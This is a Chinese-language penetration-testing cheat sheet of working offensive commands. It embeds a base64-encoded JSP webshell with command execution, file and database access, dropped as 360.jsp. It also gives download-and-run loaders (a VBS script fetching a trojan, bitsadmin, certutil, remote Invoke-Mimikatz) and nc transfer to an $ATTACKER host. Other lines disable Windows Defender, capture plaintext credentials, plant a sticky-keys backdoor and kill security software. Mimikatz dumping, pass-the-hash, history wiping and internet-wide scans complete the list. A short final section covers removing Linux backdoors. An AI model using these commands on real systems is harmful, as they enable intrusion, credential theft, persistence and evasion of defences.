# tips
# ipv4的3段私有IP地址
```
A类：10.0.0.0/8	即10.0.0.0-10.255.255.255
B类：172.16.0.0/12 即172.16.0.1-172.31.255.254
C类：192.168.0.0/16 即192.168.0.1-192.168.255.254
```
# 探测大网络空间中的存活主机
```
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 10.txt 10.0.0.0/8 > /dev/null 2>&1
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 172.txt 172.16.0.0/12 > /dev/null 2>&1
nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 -oN 192.txt 192.168.0.0/16 > /dev/null 2>&1
或
fping -a -g 10.0.0.0/8 >10.txt
fping -a -g 172.16.0.0/12 >172.txt
fping -a -g 192.168.0.0/16 >192.txt
或
masscan 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 --ping --max-rate 100000 >all.txt
masscan 0.0.0.0/0 -p443,8443 --max-rate 100000 --heartbleed >443.txt	//心脏滴血漏洞扫描
masscan -p80 0.0.0.0/0 --exclude 10.0.0.0/8,172.16.0.0/12,192.168.0.0/16 --max-rate 300000 >all.txt	//扫描全网80端口ip段，排除内网ip段(或机房ip段)
或
masscan -p80 0.0.0.0/0 --excludefile blackip.txt --max-rate 300000 >all.txt	//扫描全网80端口ip段，blackip.txt填写排除ip地址或ip段每行一个

```

# s5.py
```
nohup python s5.py 1080 &	//后台运行s5.py
```

# gost安全隧道
```
./gost -L=:1080	//作为标准HTTP/SOCKS5代理
./gost -L=admin:123456@:1080	//设置代理认证信息
./gost -L=http2://:443 -L=socks5://:1080 -L=ss://aes-128-cfb:123456@:8338	//多端口监听
nohup ./gost -L=:1080 > /dev/null 2>&1 &	//后台运行不记录日志
ps -ef | grep gost|grep -v grep | awk '{print $2}'| xargs kill|rm -rf /tmp/gost  //结束gost程序并删除
```
#winrar命令行打包（-m5最高压缩比）
```
set path="C:\Program Files\WinRAR\";%path%	//临时设置Windows路径环境变量，或
C:\Progra~1\winrar\Rar.exe	//64位
C:\Progra~2\winrar\Rar.exe	//32位
"C:\Program Files\WinRAR\Rar.exe" a -r test.rar -m4 -ibck c:/xxx	//打包xxx文件夹
"C:\Program Files\WinRAR\Rar.exe" a -r test.rar -x*.php -m4 -ibck test 	//排除PHP文件
"C:\Program Files\WinRAR\Rar.exe" a -r test.rar -x*\demo\ -m4 -ibck test 	//排除demo目录
"C:\Program Files\WinRAR\Rar.exe" a -r test.rar -m4 -ibck test/*.txt	//特定文件打包(.txt)
```

# 7z命令行打包
```
C:\ProgramData\7za.exe a -r -mx5 -t7z E:\wwwroot\xxxx.7z E:\wwwroot\	//打包指定目录为7z压缩包
C:\ProgramData\7za.exe a -r -mx5 -tzip E:\wwwroot\xxxx.zip E:\wwwroot\	//打包指定目录为zip压缩包
C:\ProgramData\7za.exe x E:\wwwroot\xxxx.7z -oE:\wwwroot\ -aoa	//解压到指定目录
```

# 文件传输
```
echo base64后的木马内容 |base64 -d > 360.jsp
echo PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KCjxqc3A6cm9vdCB4bWxuczpqc3A9Imh0dHA6Ly9qYXZhLnN1bi5jb20vSlNQL1BhZ2UiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIiB4bWxuczpjPSJodHRwOi8vamF2YS5zdW4uY29tL2pzcC9qc3RsL2NvcmUiIHZlcnNpb249IjEuMiI+CiAgPGpzcDpkaXJlY3RpdmUucGFnZSBjb250ZW50VHlwZT0idGV4dC9odG1sIiBwYWdlRW5jb2Rpbmc9IlVURi04Ii8+CiAgPGpzcDpkaXJlY3RpdmUucGFnZSBpbXBvcnQ9ImphdmEuaW8uKiIvPgogIDxqc3A6ZGlyZWN0aXZlLnBhZ2UgaW1wb3J0PSJqYXZhLnV0aWwuKiIvPgogIDxqc3A6ZGlyZWN0aXZlLnBhZ2UgaW1wb3J0PSJqYXZhLm5ldC4qIi8+CiAgPGpzcDpkaXJlY3RpdmUucGFnZSBpbXBvcnQ9ImphdmEuc3FsLioiLz4KICA8anNwOmRpcmVjdGl2ZS5wYWdlIGltcG9ydD0iamF2YS50ZXh0LioiLz4KICA8anNwOmRlY2xhcmF0aW9uPlN0cmluZyBQd2Q9IjAyMyI7U3RyaW5nIGNzPSJVVEYtOCI7U3RyaW5nIEVDKFN0cmluZyBzKXRocm93cyBFeGNlcHRpb257cmV0dXJuIG5ldyBTdHJpbmcocy5nZXRCeXRlcygiSVNPLTg4NTktMSIpLGNzKTt9Q29ubmVjdGlvbiBHQyhTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue1N0cmluZ1tdIHg9cy50cmltKCkuc3BsaXQoIlxyXG4iKTtDbGFzcy5mb3JOYW1lKHhbMF0udHJpbSgpKTtpZih4WzFdLmluZGV4T2YoImpkYmM6b3JhY2xlIikhPS0xKXtyZXR1cm4gRHJpdmVyTWFuYWdlci5nZXRDb25uZWN0aW9uKHhbMV0udHJpbSgpKyI6Iit4WzRdLHhbMl0uZXF1YWxzSWdub3JlQ2FzZSgiWy9udWxsXSIpPyIiOnhbMl0seFszXS5lcXVhbHNJZ25vcmVDYXNlKCJbL251bGxdIik/IiI6eFszXSk7fWVsc2V7Q29ubmVjdGlvbiBjPURyaXZlck1hbmFnZXIuZ2V0Q29ubmVjdGlvbih4WzFdLnRyaW0oKSx4WzJdLmVxdWFsc0lnbm9yZUNhc2UoIlsvbnVsbF0iKT8iIjp4WzJdLHhbM10uZXF1YWxzSWdub3JlQ2FzZSgiWy9udWxsXSIpPyIiOnhbM10pO2lmKHgubGVuZ3RoJmd0OzQpe2Muc2V0Q2F0YWxvZyh4WzRdKTt9cmV0dXJuIGM7fX12b2lkIEFBKFN0cmluZ0J1ZmZlciBzYil0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgcltdPUZpbGUubGlzdFJvb3RzKCk7Zm9yKGludCBpPTA7aSZsdDtyLmxlbmd0aDtpKyspe3NiLmFwcGVuZChyW2ldLnRvU3RyaW5nKCkuc3Vic3RyaW5nKDAsMikpO319dm9pZCBCQihTdHJpbmcgcyxTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIG9GPW5ldyBGaWxlKHMpLGxbXT1vRi5saXN0RmlsZXMoKTtTdHJpbmcgc1Qsc1Esc0Y9IiI7amF2YS51dGlsLkRhdGUgZHQ7U2ltcGxlRGF0ZUZvcm1hdCBmbT1uZXcgU2ltcGxlRGF0ZUZvcm1hdCgieXl5eS1NTS1kZCBISDptbTpzcyIpO2ZvcihpbnQgaT0wOyBpJmx0O2wubGVuZ3RoOyBpKyspe2R0PW5ldyBqYXZhLnV0aWwuRGF0ZShsW2ldLmxhc3RNb2RpZmllZCgpKTtzVD1mbS5mb3JtYXQoZHQpO3NRPWxbaV0uY2FuUmVhZCgpPyJSIjoiIjtzUSArPWxbaV0uY2FuV3JpdGUoKT8iIFciOiIiO2lmKGxbaV0uaXNEaXJlY3RvcnkoKSl7c2IuYXBwZW5kKGxbaV0uZ2V0TmFtZSgpKyIvXHQiK3NUKyJcdCIrbFtpXS5sZW5ndGgoKSsiXHQiK3NRKyJcbiIpO31lbHNle3NGKz1sW2ldLmdldE5hbWUoKSsiXHQiK3NUKyJcdCIrbFtpXS5sZW5ndGgoKSsiXHQiK3NRKyJcbiI7fX1zYi5hcHBlbmQoc0YpO312b2lkIEVFKFN0cmluZyBzKXRocm93cyBFeGNlcHRpb257RmlsZSBmPW5ldyBGaWxlKHMpO2lmKGYuaXNEaXJlY3RvcnkoKSl7RmlsZSB4W109Zi5saXN0RmlsZXMoKTtmb3IoaW50IGs9MDsgayAmbHQ7IHgubGVuZ3RoOyBrKyspe2lmKCF4W2tdLmRlbGV0ZSgpKXtFRSh4W2tdLmdldFBhdGgoKSk7fX19Zi5kZWxldGUoKTt9dm9pZCBGRihTdHJpbmcgcyxIdHRwU2VydmxldFJlc3BvbnNlIHIpdGhyb3dzIEV4Y2VwdGlvbntpbnQgbjtieXRlW10gYj1uZXcgYnl0ZVs1MTJdO3IucmVzZXQoKTtTZXJ2bGV0T3V0cHV0U3RyZWFtIG9zPXIuZ2V0T3V0cHV0U3RyZWFtKCk7QnVmZmVyZWRJbnB1dFN0cmVhbSBpcz1uZXcgQnVmZmVyZWRJbnB1dFN0cmVhbShuZXcgRmlsZUlucHV0U3RyZWFtKHMpKTtvcy53cml0ZSgoIi0mZ3Q7IisifCIpLmdldEJ5dGVzKCksMCwzKTt3aGlsZSgobj1pcy5yZWFkKGIsMCw1MTIpKSE9LTEpe29zLndyaXRlKGIsMCxuKTt9b3Mud3JpdGUoKCJ8IisiJmx0Oy0iKS5nZXRCeXRlcygpLDAsMyk7b3MuY2xvc2UoKTtpcy5jbG9zZSgpO312b2lkIEdHKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257U3RyaW5nIGg9IjAxMjM0NTY3ODlBQkNERUYiO0ZpbGUgZj1uZXcgRmlsZShzKTtmLmNyZWF0ZU5ld0ZpbGUoKTtGaWxlT3V0cHV0U3RyZWFtIG9zPW5ldyBGaWxlT3V0cHV0U3RyZWFtKGYpO2ZvcihpbnQgaT0wOyBpJmx0O2QubGVuZ3RoKCk7aSs9Mil7b3Mud3JpdGUoKGguaW5kZXhPZihkLmNoYXJBdChpKSkgJmx0OyZsdDsgNCB8IGguaW5kZXhPZihkLmNoYXJBdChpKzEpKSkpO31vcy5jbG9zZSgpO312b2lkIEhIKFN0cmluZyBzLFN0cmluZyBkKXRocm93cyBFeGNlcHRpb257RmlsZSBzZj1uZXcgRmlsZShzKSxkZj1uZXcgRmlsZShkKTtpZihzZi5pc0RpcmVjdG9yeSgpKXtpZighZGYuZXhpc3RzKCkpe2RmLm1rZGlyKCk7fUZpbGUgeltdPXNmLmxpc3RGaWxlcygpO2ZvcihpbnQgaj0wOyBqJmx0O3oubGVuZ3RoOyBqKyspe0hIKHMrIi8iK3pbal0uZ2V0TmFtZSgpLGQrIi8iK3pbal0uZ2V0TmFtZSgpKTt9fWVsc2V7RmlsZUlucHV0U3RyZWFtIGlzPW5ldyBGaWxlSW5wdXRTdHJlYW0oc2YpO0ZpbGVPdXRwdXRTdHJlYW0gb3M9bmV3IEZpbGVPdXRwdXRTdHJlYW0oZGYpO2ludCBuO2J5dGVbXSBiPW5ldyBieXRlWzUxMl07d2hpbGUoKG49aXMucmVhZChiLDAsNTEyKSkhPS0xKXtvcy53cml0ZShiLDAsbik7fWlzLmNsb3NlKCk7b3MuY2xvc2UoKTt9fXZvaWQgSUkoU3RyaW5nIHMsU3RyaW5nIGQpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIHNmPW5ldyBGaWxlKHMpLGRmPW5ldyBGaWxlKGQpO3NmLnJlbmFtZVRvKGRmKTt9dm9pZCBKSihTdHJpbmcgcyl0aHJvd3MgRXhjZXB0aW9ue0ZpbGUgZj1uZXcgRmlsZShzKTtmLm1rZGlyKCk7fXZvaWQgS0soU3RyaW5nIHMsU3RyaW5nIHQpdGhyb3dzIEV4Y2VwdGlvbntGaWxlIGY9bmV3IEZpbGUocyk7U2ltcGxlRGF0ZUZvcm1hdCBmbT1uZXcgU2ltcGxlRGF0ZUZvcm1hdCgieXl5eS1NTS1kZCBISDptbTpzcyIpO2phdmEudXRpbC5EYXRlIGR0PWZtLnBhcnNlKHQpO2Yuc2V0TGFzdE1vZGlmaWVkKGR0LmdldFRpbWUoKSk7fXZvaWQgTEwoU3RyaW5nIHMsU3RyaW5nIGQpdGhyb3dzIEV4Y2VwdGlvbntVUkwgdT1uZXcgVVJMKHMpO2ludCBuPTA7RmlsZU91dHB1dFN0cmVhbSBvcz1uZXcgRmlsZU91dHB1dFN0cmVhbShkKTtIdHRwVVJMQ29ubmVjdGlvbiBoPShIdHRwVVJMQ29ubmVjdGlvbikgdS5vcGVuQ29ubmVjdGlvbigpO0lucHV0U3RyZWFtIGlzPWguZ2V0SW5wdXRTdHJlYW0oKTtieXRlW10gYj1uZXcgYnl0ZVs1MTJdO3doaWxlKChuPWlzLnJlYWQoYikpIT0tMSl7b3Mud3JpdGUoYiwwLG4pO31vcy5jbG9zZSgpO2lzLmNsb3NlKCk7aC5kaXNjb25uZWN0KCk7fXZvaWQgTU0oSW5wdXRTdHJlYW0gaXMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257U3RyaW5nIGw7QnVmZmVyZWRSZWFkZXIgYnI9bmV3IEJ1ZmZlcmVkUmVhZGVyKG5ldyBJbnB1dFN0cmVhbVJlYWRlcihpcykpO3doaWxlKChsPWJyLnJlYWRMaW5lKCkpIT1udWxsKXtzYi5hcHBlbmQobCsiXHJcbiIpO319dm9pZCBOTihTdHJpbmcgcyxTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntDb25uZWN0aW9uIGM9R0Mocyk7UmVzdWx0U2V0IHI9cy5pbmRleE9mKCJqZGJjOm9yYWNsZSIpIT0tMT9jLmdldE1ldGFEYXRhKCkuZ2V0U2NoZW1hcygpOmMuZ2V0TWV0YURhdGEoKS5nZXRDYXRhbG9ncygpO3doaWxlKHIubmV4dCgpKXtzYi5hcHBlbmQoci5nZXRTdHJpbmcoMSkrIlx0Iik7fXIuY2xvc2UoKTtjLmNsb3NlKCk7fXZvaWQgT08oU3RyaW5nIHMsU3RyaW5nQnVmZmVyIHNiKXRocm93cyBFeGNlcHRpb257Q29ubmVjdGlvbiBjPUdDKHMpO1N0cmluZ1tdIHg9cy50cmltKCkuc3BsaXQoIlxyXG4iKTtSZXN1bHRTZXQgcj1jLmdldE1ldGFEYXRhKCkuZ2V0VGFibGVzKG51bGwscy5pbmRleE9mKCJqZGJjOm9yYWNsZSIpIT0tMT94Lmxlbmd0aCZndDs1P3hbNV06eFs0XTpudWxsLCIlIixuZXcgU3RyaW5nW117IlRBQkxFIn0pO3doaWxlKHIubmV4dCgpKXtzYi5hcHBlbmQoci5nZXRTdHJpbmcoIlRBQkxFX05BTUUiKSsiXHQiKTt9ci5jbG9zZSgpO2MuY2xvc2UoKTt9dm9pZCBQUChTdHJpbmcgcyxTdHJpbmdCdWZmZXIgc2IpdGhyb3dzIEV4Y2VwdGlvbntTdHJpbmdbXSB4PXMudHJpbSgpLnNwbGl0KCJcclxuIik7Q29ubmVjdGlvbiBjPUdDKHMpO1N0YXRlbWVudCBtPWMuY3JlYXRlU3RhdGVtZW50KDEwMDUsMTAwNyk7UmVzdWx0U2V0IHI9bS5leGVjdXRlUXVlcnkoInNlbGVjdCAqIGZyb20gIit4W3gubGVuZ3RoLTFdKTtSZXN1bHRTZXRNZXRhRGF0YSBkPXIuZ2V0TWV0YURhdGEoKTtmb3IoaW50IGk9MTtpJmx0Oz1kLmdldENvbHVtbkNvdW50KCk7aSsrKXtzYi5hcHBlbmQoZC5nZXRDb2x1bW5OYW1lKGkpKyIgKCIrZC5nZXRDb2x1bW5UeXBlTmFtZShpKSsiKVx0Iik7fXIuY2xvc2UoKTttLmNsb3NlKCk7Yy5jbG9zZSgpO312b2lkIFFRKFN0cmluZyBjcyxTdHJpbmcgcyxTdHJpbmcgcSxTdHJpbmdCdWZmZXIgc2IsU3RyaW5nIHApdGhyb3dzIEV4Y2VwdGlvbntDb25uZWN0aW9uIGM9R0Mocyk7U3RhdGVtZW50IG09Yy5jcmVhdGVTdGF0ZW1lbnQoMTAwNSwxMDA4KTtCdWZmZXJlZFdyaXRlciBidz1udWxsO3RyeXtSZXN1bHRTZXQgcj1tLmV4ZWN1dGVRdWVyeShxLmluZGV4T2YoIi0tZjoiKSE9LTE/cS5zdWJzdHJpbmcoMCxxLmluZGV4T2YoIi0tZjoiKSk6cSk7UmVzdWx0U2V0TWV0YURhdGEgZD1yLmdldE1ldGFEYXRhKCk7aW50IG49ZC5nZXRDb2x1bW5Db3VudCgpO2ZvcihpbnQgaT0xOyBpICZsdDs9bjsgaSsrKXtzYi5hcHBlbmQoZC5nZXRDb2x1bW5OYW1lKGkpKyJcdHxcdCIpO31zYi5hcHBlbmQoIlxyXG4iKTtpZihxLmluZGV4T2YoIi0tZjoiKSE9LTEpe0ZpbGUgZmlsZT1uZXcgRmlsZShwKTtpZihxLmluZGV4T2YoIi10bzoiKT09LTEpe2ZpbGUubWtkaXIoKTt9Ync9bmV3IEJ1ZmZlcmVkV3JpdGVyKG5ldyBPdXRwdXRTdHJlYW1Xcml0ZXIobmV3IEZpbGVPdXRwdXRTdHJlYW0obmV3IEZpbGUocS5pbmRleE9mKCItdG86IikhPS0xP3AudHJpbSgpOnArcS5zdWJzdHJpbmcocS5pbmRleE9mKCItLWY6IikrNCxxLmxlbmd0aCgpKS50cmltKCkpLHRydWUpLGNzKSk7fXdoaWxlKHIubmV4dCgpKXtmb3IoaW50IGk9MTsgaSZsdDs9bjtpKyspe2lmKHEuaW5kZXhPZigiLS1mOiIpIT0tMSl7Yncud3JpdGUoci5nZXRPYmplY3QoaSkrIiIrIlx0Iik7YncuZmx1c2goKTt9ZWxzZXtzYi5hcHBlbmQoci5nZXRPYmplY3QoaSkrIiIrIlx0fFx0Iik7fX1pZihidyE9bnVsbCl7YncubmV3TGluZSgpO31zYi5hcHBlbmQoIlxyXG4iKTt9ci5jbG9zZSgpO2lmKGJ3IT1udWxsKXtidy5jbG9zZSgpO319Y2F0Y2goRXhjZXB0aW9uIGUpe3NiLmFwcGVuZCgiUmVzdWx0XHR8XHRcclxuIik7dHJ5e20uZXhlY3V0ZVVwZGF0ZShxKTtzYi5hcHBlbmQoIkV4ZWN1dGUgU3VjY2Vzc2Z1bGx5IVx0fFx0XHJcbiIpO31jYXRjaChFeGNlcHRpb24gZWUpe3NiLmFwcGVuZChlZS50b1N0cmluZygpKyJcdHxcdFxyXG4iKTt9fW0uY2xvc2UoKTtjLmNsb3NlKCk7fTwvanNwOmRlY2xhcmF0aW9uPgogIDxqc3A6c2NyaXB0bGV0PmNzPXJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJ6MCIpIT1udWxsP3JlcXVlc3QuZ2V0UGFyYW1ldGVyKCJ6MCIpKyIiOmNzO3Jlc3BvbnNlLnNldENvbnRlbnRUeXBlKCJ0ZXh0L2h0bWwiKTtyZXNwb25zZS5zZXRDaGFyYWN0ZXJFbmNvZGluZyhjcyk7U3RyaW5nQnVmZmVyIHNiPW5ldyBTdHJpbmdCdWZmZXIoIiIpO3RyeXtTdHJpbmcgWj1FQyhyZXF1ZXN0LmdldFBhcmFtZXRlcihQd2QpKyIiKTtTdHJpbmcgejE9RUMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoInoxIikrIiIpO1N0cmluZyB6Mj1FQyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiejIiKSsiIik7c2IuYXBwZW5kKCItJmd0OyIrInwiKTtTdHJpbmcgcz1yZXF1ZXN0LmdldFNlc3Npb24oKS5nZXRTZXJ2bGV0Q29udGV4dCgpLmdldFJlYWxQYXRoKCIvIik7aWYoWi5lcXVhbHMoIkEiKSl7c2IuYXBwZW5kKHMrIlx0Iik7aWYoIXMuc3Vic3RyaW5nKDAsMSkuZXF1YWxzKCIvIikpe0FBKHNiKTt9fWVsc2UgaWYoWi5lcXVhbHMoIkIiKSl7QkIoejEsc2IpO31lbHNlIGlmKFouZXF1YWxzKCJDIikpe1N0cmluZyBsPSIiO0J1ZmZlcmVkUmVhZGVyIGJyPW5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIobmV3IEZpbGVJbnB1dFN0cmVhbShuZXcgRmlsZSh6MSkpKSk7d2hpbGUoKGw9YnIucmVhZExpbmUoKSkhPW51bGwpe3NiLmFwcGVuZChsKyJcclxuIik7fWJyLmNsb3NlKCk7fWVsc2UgaWYoWi5lcXVhbHMoIkQiKSl7QnVmZmVyZWRXcml0ZXIgYncyPW5ldyBCdWZmZXJlZFdyaXRlcihuZXcgT3V0cHV0U3RyZWFtV3JpdGVyKG5ldyBGaWxlT3V0cHV0U3RyZWFtKG5ldyBGaWxlKHoxKSkpKTtidzIud3JpdGUoejIpO2J3Mi5jbG9zZSgpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJFIikpe0VFKHoxKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiRiIpKXtGRih6MSxyZXNwb25zZSk7fWVsc2UgaWYoWi5lcXVhbHMoIkciKSl7R0coejEsejIpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJIIikpe0hIKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiSSIpKXtJSSh6MSx6Mik7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIkoiKSl7SkooejEpO3NiLmFwcGVuZCgiMSIpO31lbHNlIGlmKFouZXF1YWxzKCJLIikpe0tLKHoxLHoyKTtzYi5hcHBlbmQoIjEiKTt9ZWxzZSBpZihaLmVxdWFscygiTCIpKXtMTCh6MSx6Mik7c2IuYXBwZW5kKCIxIik7fWVsc2UgaWYoWi5lcXVhbHMoIk0iKSl7U3RyaW5nW10gYz17ejEuc3Vic3RyaW5nKDIpLHoxLnN1YnN0cmluZygwLDIpLHoyfTtQcm9jZXNzIHA9UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhjKTtNTShwLmdldElucHV0U3RyZWFtKCksc2IpO01NKHAuZ2V0RXJyb3JTdHJlYW0oKSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIk4iKSl7Tk4oejEsc2IpO31lbHNlIGlmKFouZXF1YWxzKCJPIikpe09PKHoxLHNiKTt9ZWxzZSBpZihaLmVxdWFscygiUCIpKXtQUCh6MSxzYik7fWVsc2UgaWYoWi5lcXVhbHMoIlEiKSl7UVEoY3MsejEsejIsc2IsejIuaW5kZXhPZigiLXRvOiIpIT0tMT96Mi5zdWJzdHJpbmcoejIuaW5kZXhPZigiLXRvOiIpKzQsejIubGVuZ3RoKCkpOnMucmVwbGFjZUFsbCgiXFxcXCIsIi8iKSsiaW1hZ2VzLyIpO319Y2F0Y2goRXhjZXB0aW9uIGUpe3NiLmFwcGVuZCgiRVJST1IiKyI6Ly8gIitlLnRvU3RyaW5nKCkpO31zYi5hcHBlbmQoInwiKyImbHQ7LSIpO291dC5wcmludChzYi50b1N0cmluZygpKTs8L2pzcDpzY3JpcHRsZXQ+CjwvanNwOnJvb3Q+Cg== |base64 -d > 360.jsp

nc -l 23456 | tar xvzf - // 本地监听和接受文件
tar cvzf - "文件名或者目录" | nc x.x.x.x 23456 // 压缩文件或目录传输
或
nc -l -p 4444 < /tool/file.exe	//本地发送
nc $ATTACKER 4444 > file.exe	//远程接受

wget http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//文件下载
wget -c http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//断点续传
wget -b http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//后台下载
wget -O /home/ http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//文件另存为（文件名或路径）
wget --http-user=youuser --http-passwd=youpassword http://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//基础认证
wget --no-check-certificate https://soft.vpser.net/web/nginx/nginx-0.8.0.tar.gz	//https协议下载
wget -c -r -np -k -L -p http://soft.vpser.net/web/	//全站web目录下载

curl -O https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//将文件保存到本地
curl -k -O https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//下载https的网站将文件保存到本地
curl -o ssocks.tar.gz https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//将文件保存到本地并保存为ssocks.tar.gz
curl -C - https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz	//断点续传下载文件

echo Set Post = CreateObject("Msxml2.XMLHTTP") >>zl.vbs
echo Set Shell = CreateObject("Wscript.Shell") >>zl.vbs
echo Post.Open "GET","http://x.x.x.x/muma.exe",0 >>zl.vbs
echo Post.Send() >>zl.vbs
echo Set aGet = CreateObject("ADODB.Stream") >>zl.vbs
echo aGet.Mode = 3 >>zl.vbs
echo aGet.Type = 1 >>zl.vbs
echo aGet.Open() >>zl.vbs
echo aGet.Write(Post.responseBody) >>zl.vbs
echo aGet.SaveToFile "c:\zl.exe",2 >>zl.vbs
echo wscript.sleep 1000 >>zl.vbs
echo Shell.Run ("c:\zl.exe") >>zl.vbs
执行C:>cscript zl.vbs

cmd.exe /c bitsadmin /transfer f370 http://x.x.x.x/as %APPDATA%\f370.exe&%APPDATA%\f370.exe&del %APPDATA%\f370.exe
certutil.exe -urlcache -split -f https://x.x.x.x/version.txt   file.txt
HH.exe http://x.x.x.x/test.exe c:\\test.exe	//适用于sqltools
```

# Windows渗透常用命令
```
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD /f	//关闭 Windows Defender 杀毒
REG add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 0 /t REG_DWORD /f	//开启 Windows Defender 杀毒
REG add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1	//将regedit值设置为1并启动wdigest auth抓取明文密码
REG query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential	//查询是否启用wdigest auth抓取明文密码
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "c:\windows\system32\cmd.exe" /d "RUNASADMIN" /f	//以管理员权限执行命令
reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "c:\windows\system32\cmd.exe" /f	//删除以管理员权限执行命令
mstsc /admin /v:192.168.58.129	//突破终端服务器已超过允许的最大连接数
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f	//启用RDP访问3389
REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber //十六进制转十进制，查看rdp端口
或
tasklist /svc |find "TermService" //查看系统进程TermService服务对应的PID
netstat -ano | findstr pid	//查找TermService服务PID对应的端口
或
for /f "tokens=2 delims=x" %a in ('reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" ^| find "PortNumber"') do (set /a n=0x%a)
REG ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fSingleSessionPerUser /t REG_DWORD /d 0 /f	//设置单用户允许多个RDP会话
REG query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fSingleSessionPerUser	//查看是否开单用户允许多个RDP会话
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f	//sethc粘键后门后门
ntsd -cq -pn SafeDogGuardCenter.exe	//搞死安全狗3.x
for /r c:\ %i in (Newslist*.aspx) do @echo %i	//在WINDOWS下命令查找文件
```

# mimikatz常用命令
```
mimikatz.exe "privilege::debug" "log" "sekurlsa::logonPasswords full" exit	//获取密码
procdump.exe -accepteula -ma lsass.exe lsass.dmp	//32系统转储内存
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp	//64系统转储内存
mimikatz.exe "sekurlsa::minidump lsass.dmp" "log" "sekurlsa::logonpasswords"	//通过转储内存文件获取密码
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /ntlm:{NTLM_hash} \"/run:mstsc.exe /restrictedadmin\""	//mimikatz传递哈希
mimikatz.exe "privilege::debug" "sekurlsa::pth /user:Administrator /domain:remoteserver /aes256:{aes256_hmac} \"/run:mstsc.exe /restrictedadmin\""	//mimikatz传递AES-KEY
PowerShell IEX (New-Object System.Net.Webclient).DownloadString(‘https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’) ; Invoke-Mimikatz -DumpCreds	//远程加载mimikatz
```
# 清除BASH历史
```
export HISTSIZE=0;export HISTFILE=/dev/null
```

# Centos/Debian/Ubuntu安装masscan
```
yum install -y unzip gcc make libpcap-devel
wget https://github.com/robertdavidgraham/masscan/archive/master.zip
unzip master.zip && cd masscan*
make && make install && cd ../ && rm -rf master.zip masscan*
或
sudo apt-get install -y unzip gcc make libpcap-dev
wget https://github.com/robertdavidgraham/masscan/archive/master.zip
unzip master.zip && cd masscan*
sudo make && sudo make install && cd ../ && rm -rf master.zip masscan*
```

# chattr命令防止系统中某个关键文件被修改
```
chattr +i /etc/fstab	//开启文件或目录的该项属性
chattr -i /etc/fstab	//关闭文件或目录的该项属性
lsattr passwd			//查看文件属性
s---ia-------e-- passwd
chattr -isa /etc/passwd	//关闭文件sai属性
```

# Linux删除远控后门
```
netstat -tnlpa | grep port 	//查看上线端口和pid
lsof -p pid	//查看上线端口进程对应文件
kill -9 pid	//结束进程(注意此处存在重复上线进程，ps aux查看会发现两个/bin/ps)
ps -ef |grep able6 |grep -v grep | awk '{print $2}'	//查看进程pid号
fuser -k /tmp/.wq4sMLArXw	//杀死访问指定文件的所有进程(重复上线修复)
